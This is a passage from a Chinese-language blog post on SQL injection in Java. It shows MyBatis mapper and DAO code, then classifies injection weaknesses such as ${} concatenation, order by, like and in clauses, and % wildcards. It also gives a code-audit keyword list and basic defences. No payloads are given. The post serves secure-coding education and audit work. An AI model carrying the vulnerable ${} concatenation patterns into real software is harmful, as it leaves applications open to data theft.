    <!-- 映射SQL语句，比如<insert>标签用于映射insert语句，
     id属性对应Dao接口中的方法名
     parameterType表示Dao接口方法参数的类型，可以指定完整类名，
     这里指定实体类的别名，也就是在mybatis.xml中定义的别名
     在sql语句中使用#{}表达式来指定要插入的列，{}中指定实体的字段名-->
    <insert id="save" parameterType="edu.nf.ch01.entity.Users">
        insert into user_info(u_name) values(#{userName})
    </insert>

    <!-- 如果参数类型时Map集合，那么#{}表达式对应的就是Map的kek，parameterType中也可以为map -->
    <insert id="save2" parameterType="java.util.Map">
        insert into user_info(u_name) values(#{uname})
    </insert>

    <update id="update" parameterType="edu.nf.ch01.entity.Users">
        update user_info set u_name = #{userName} where u_id = #{uid};
    </update>

    <delete id="delete" parameterType="int">
        delete from user_info where u_id = #{id}
    </delete>
    <!-- 当有多个参数时，不需要指定parameterType属性，
    而是使用#{param1}#{param2}...的方式映射参数，对应方法参数的顺序 -->
    <update id="update2">
        update user_info set u_name = #{param1} where u_id = #{param2}
    </update>
    
    <!-- 查询当个用户，将结果集封装成一个实体对象
     resultType属性指定查询结果集的返回类型，
     如果返回一个实体，则返回引用mybatis.xml文件中Alias设置的别名
     需要注意的是，查询sql语句中，查询column必须要和实体的字段名称相同-->
    <select id="getUserById" parameterType="java.lang.String" resultType="users">
        select u_id as uid, u_name as userName from user_info2 where u_id = #{id}
    </select>

    <!-- 查询单个用户，将结果集封装成一个map集合
     此时只需要将resultType设置为map即可-->
    <select id="getUserById2" parameterType="java.lang.String" resultType="map">
        select u_id, u_name from user_info2 where u_id = #{id}
    </select>

    <!-- 查询用户列表，返回list集合，集合中封装了多个实体对象 -->
    <select id="listUser" resultType="users">
        select u_id as uid, u_name as userName from user_info2
    </select>

    <!-- 查询用户列表，返回list集合，集合中存放多个map对象 -->
    <select id="listUser2" resultType="map">
        select u_id, u_name from user_info2
    </select>
</mapper>
```





新建Users类：

```java
private Integer uid;
private String userName;

public Integer getUid() {
    return uid;
}

public void setUid(Integer uid) {
    this.uid = uid;
}

public String getUserName() {
    return userName;
}

public void setUserName(String userName) {
    this.userName = userName;
}
```





MybatisUtils类：

```java
private static SqlSessionFactory sqlSessionFactory;

/**
* 在静态代码块中初始化工厂
*/
static{
    //先查找mybatis的核心配置文件来初始化数据源，
    //默认从classpath下查找核心配置文件
    try {
        //注意：import org.apache.ibatis.io.Resources;
        InputStream is = Resources.getResourceAsStream("mybatis.xml");
        //创建一个SqlSessionFactoryBuilder来解析配置文件的信息，
        // 然后创建出SqlSessionFactory实例
        SqlSessionFactoryBuilder builder = new SqlSessionFactoryBuilder();
        //build方法传入一个输入流，通过解析后返回一个SqlSessionFactory实例
        sqlSessionFactory = builder.build(is);

    } catch (IOException e) {
        e.printStackTrace();
    }
}

/**
* 提供一个获取SqlSession的方法
* @param autoCommit 在获取SQL Session时可以传递一个boolean类型的参数值，
*             这个参数的作用似乎用于设置是否手动提交事务还是自动提交事务，
*             false为手动提交，true为自动提交
* @return
*/
public static SqlSession getSqlSession(boolean autoCommit){
    //通过openSession方法来创建一个sqlSession实例，
    //有了SqlSession，就可以来访问数据库
    return sqlSessionFactory.openSession(autoCommit);
}
```





UserDao接口：

```java
/**
     * 通过传递一个对象形式保存用户
     * @param user
     */
void save(Users user);

    /**
     * 通过传递一个map集合保存用户
     * @param map
     */
void save2(Map<String, Object> map);

    /**
     * 通过传递一个对象修改用户
     * @param user
     */
void update(Users user);

    /**
     * 通过id删除用户
     * @param id
     */
void delete(int id);

    /**
     * 通过传递多个参数修改用户
     * @param userName
     * @param uid
     */
void update2(String userName, int uid);

/**
     * 根据id查询一条结果集，返回一个实体对象
     * @param uid
     * @return
     */
Users getUserById(String uid);

/**
     * 根据id查询一条结果集，返回一个map集合
     * @param id
     * @return
     */
Map<String, Object> getUserById2(String id);

/**
     * 查询所有，返回多个Users对象
     * @return
     */
List<Users> listUser();

/**
     * 根据所有结果集，返回多个map集合
     * @return
     */
List<Map<String, Object>> listUser2();
```



在UserDaoImpl类实现UserDao接口并重写抽象方法：

```java
@Override
public void save(Users user) {
    //获取SqlSession实例，true表示自动提交事务
    try(SqlSession session = MybatisUtils.getSqlSession(true)){
        //getMapper方法返回一个代理对象，这个代理对象也是实现了UserDao接口
        //底层使用JDK动态代理技术
        UserDao dao = session.getMapper(UserDao.class);
        //当执行save方法时，其实调用的时代理对象的save，
        //它会解析mapper映射配置文件，找到id为save的元素
        //并执行其中的sql语句
        dao.save(user);
    }catch (RuntimeException e){

        throw e;
    }
}

@Override
public void save2(Map<String, Object> map) {
    try(SqlSession sqlSession = MybatisUtils.getSqlSession(true)){
        sqlSession.getMapper(UserDao.class).save2(map);
    }catch(RuntimeException e){
        throw e;
    }
}

@Override
public void update(Users user) {
    try(SqlSession sqlSession = MybatisUtils.getSqlSession(true)){
        sqlSession.getMapper(UserDao.class).update(user);
    }catch (RuntimeException e){
        throw e;
    }
}

@Override
public void delete(int id) {
    try(SqlSession sqlSession = MybatisUtils.getSqlSession(true)){
        sqlSession.getMapper(UserDao.class).delete(id);
    }catch (RuntimeException e){
        throw e;
    }
}

@Override
public void update2(String userName, int uid) {
    try(SqlSession sqlSession = MybatisUtils.getSqlSession(true)) {
        sqlSession.getMapper(UserDao.class).update2(userName, uid);
    }catch (RuntimeException e){
        throw e;
    }
}

@Override
public Users getUserById(String uid) {
    try(SqlSession sqlSession = MybatisUtils.getSqlSession(true)) {
        return sqlSession.getMapper(UserDao.class).getUserById(uid);
    }catch (RuntimeException e){
        throw e;
    }
}

@Override
public Map<String, Object> getUserById2(String id) {
    try(SqlSession sqlSession = MybatisUtils.getSqlSession(true)) {
        return sqlSession.getMapper(UserDao.class).getUserById2(id);
    }catch (RuntimeException e){
        throw e;
    }
}

@Override
public List<Users> listUser() {
    try(SqlSession sqlSession = MybatisUtils.getSqlSession(true)) {
        return sqlSession.getMapper(UserDao.class).listUser();
    }catch (RuntimeException e){
        throw e;
    }
}

@Override
public List<Map<String, Object>> listUser2() {
    try(SqlSession sqlSession = MybatisUtils.getSqlSession(true)) {
        return sqlSession.getMapper(UserDao.class).listUser2();
    }catch (RuntimeException e){
        throw e;
    }
}
```









### 常见SQL注入(漏洞分类挖掘技巧)

白盒挖掘层面大致可以将SQLi的类型分为六类：

1、入参直接动态拼接；

2、预编译有误；

3、框架注入（Mybatis+Hibernate）；

4、order by 绕过预编译；

5、%和_绕过预编译；

6、SQLi检测绕过



#### 1.SQL语句参数直接动态拼接

未使用PreparedStatement或者未正确使用PreparedStatement，直接使用拼接，并且未进行过滤，导致sql注入





#### 2.预编译有误

比如：虽然使用了PreparedStatement，但是sql语句中还是进行了拼接，这样还是会导致sql注入产生





#### 3.框架使用不当导致SQL注入

##### Mybatis

- #{变量} 可以防止注入，底层是用prepareStatement实现的
- ${变量} 不能防注入，底层的用拼接实现的

若使用`${参数}`的方式，并且对用户输入过滤不严格的情况下，仍然会产生sql注入



##### Hibernate

Hibernate有几种HQL参数绑定的方式可以有效避免SQL注入

但Hibernate支持远程的SQL语句执行，若是直接采用拼接的方式，则会产生SQL注入



#### 4.order by 绕过预编译

某些情况下是不能使用PreparedStatement的，比如在order by下。order by子句后面需要加字段名或字段位置，而字段名是不能带引号的，否则就会被认为是一个字符串而不是字段名。PreparedStatement是使用占位符传递参数的，传递的字符都会有单引号包裹，就会导致order by子句失效。

所以，当使用order by子句进行查询时，需要使用拼接的方式，在这种情况下很可能产生sql注入。因此要防御SQL注入，就要进行字符串过滤。





#### 5.%和_模糊查询

在Java预编译查询中不会对%和_进行转义处理，而%和_刚好是like查询的通配符，如果没有做好相关的过滤，就可以导致恶意模糊查询，占用服务器性能，甚至可能耗尽资源，造成服务器宕机。



此类攻击场景大多出现在查询的功能接口中，直接对`%`进行过滤就是最简单有效的防御方式。



#### 6.MyBatis常见SQL注入漏洞

**6.1order by查询**

要使用order by就只能使用`${参数}`



**6.2like查询**

Mybatis的like子句使用`#{}`会报错，只能用`${}`



**6.3in参数**

Mybatis的in查询使用`#{}`会报错，只能用`${}`



### 常规代码审计

**常见关键字：**

```bash
Statement
ceateStatement
PrepareStatement
like '%{
in(${
select
update
insert
...
```







# 漏洞防御

- 最有效的是进行预编译手段
- 在Java开发中除了原生的JDBC，可以选择Druid、MyBatis等
- 类型转换，比如已知是int型，就对接收的参数都强转成int型
- 进行过滤











# 参考

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection

https://cloud.tencent.com/developer/article/1534109

https://mp.weixin.qq.com/s/qG_m7YXvEw2PwFXQDj6_qw

https://www.ms509.com/2020/06/24/Waf-Bypass-Sql/

https://xz.aliyun.com/t/368

[MySQL绕过小结 (qq.com)](https://mp.weixin.qq.com/s/PMWDpT8_z4ElU_3XLWZepA)

https://www.cnblogs.com/peterpan0707007/p/8242119.html


---

> 作者: [剑胆琴心](http://shuai06.github.io)  
> URL: https://shuai06.github.io/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/  

